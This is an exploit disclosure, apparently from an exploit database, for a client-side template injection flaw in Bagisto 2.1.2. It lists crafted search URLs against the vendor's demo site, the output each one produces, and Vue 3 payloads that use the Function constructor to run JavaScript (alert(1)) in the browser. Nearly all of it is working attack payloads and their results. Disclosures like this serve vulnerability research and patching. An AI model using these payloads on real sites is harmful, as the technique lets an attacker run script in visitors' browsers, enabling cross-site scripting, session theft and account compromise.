# Exploit Title: Bagisto 2.1.2 Client-Side Template Injection(CSTI)
# Date: 06/18/2024
# Exploit Author: tmrswrr
# Vendor Homepage: https://forums.bagisto.com/
# Version: 2.1.2
# Tested on: https://demo.bagisto.com/


https://demo.bagisto.com/bagisto-common/search?query={{7*7}}

49

https://demo.bagisto.com/bagisto-common/search?query={{'a'.toUpperCase()}}

A

https://demo.bagisto.com/bagisto/search?query={{ Object.keys(this) }}

[ "_", "onSubmit", "onInvalidSubmit", "lazyImages", "animateBoxes" ]

> Payloads for VueJS 3

https://demo.bagisto.com/bagisto/search?query={{_openBlock.constructor('alert(1)')()}}
https://demo.bagisto.com/bagisto/search?query={{-function(){this.alert(1)}()}}

> You will be see alert button
